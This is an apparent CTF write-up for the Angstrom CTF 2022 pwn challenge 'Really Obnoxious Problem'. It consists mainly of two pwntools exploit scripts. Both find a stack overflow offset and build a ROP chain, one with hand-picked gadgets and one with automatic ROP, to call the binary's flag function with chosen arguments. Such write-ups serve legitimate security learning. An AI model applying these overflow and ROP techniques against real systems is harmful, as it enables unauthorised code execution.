---
name: Really Obnoxious Problem (2022)
event: Angstrom CTF 2022
category: Pwn
description: Writeup for Really Obnoxious Problem (Pwn) - Angstrom CTF (2022) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Really Obnoxious Problem

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/YmJoeoXilac/0.jpg)](https://youtu.be/YmJoeoXilac?t=3155 "Angstrom CTF 2022: Really Obnoxious Problem")

## Description

> You know the drill.

## Solution

#### manual.py

{% code overflow="wrap" %}
```py
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe, level='warn')
    p.sendlineafter(b':', b'crypto')
    p.sendlineafter(b':', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './really_obnoxious_problem'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(500))

# Start program
io = start()

# Params (found with ghidra)
param_1 = 0x1337  # $rdi
param_2 = 0x402004  # $rsi (*"bobby")

# Gadgets to prep params
pop_rdi = 0x4013f3
pop_rsi_r15 = 0x4013f1

# Build the payload
payload = flat({
    offset: [
        pop_rdi,  # Prep param 1
        param_1,  # 0x1337
        pop_rsi_r15,  # Prep param 2
        param_2,  # "bobby"
        0x0,  # junk for r15
        elf.functions.flag
    ]
})

# Send the payload
io.sendlineafter(b':', b'crypto')  # Name
io.sendlineafter(b':', payload)  # Address

# Got Shell?
io.interactive()
```
{% endcode %}

#### ropstar.py

{% code overflow="wrap" %}
```py
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe, level='warn')
    p.sendlineafter(b':', b'crypto')
    p.sendlineafter(b':', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './really_obnoxious_problem'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(500))

# Start program
io = start()

# Create ROP object (autorop)
rop = ROP(elf)

# Gadgets to prep params
rop.flag(0x1337, next(elf.search(b'bobby')))

# Build the payload
payload = flat({
    offset: rop.chain()
})

# Send the payload
io.sendlineafter(b':', b'crypto')  # Name
io.sendlineafter(b':', payload)  # Address

# Got Shell?
io.interactive()
```
{% endcode %}
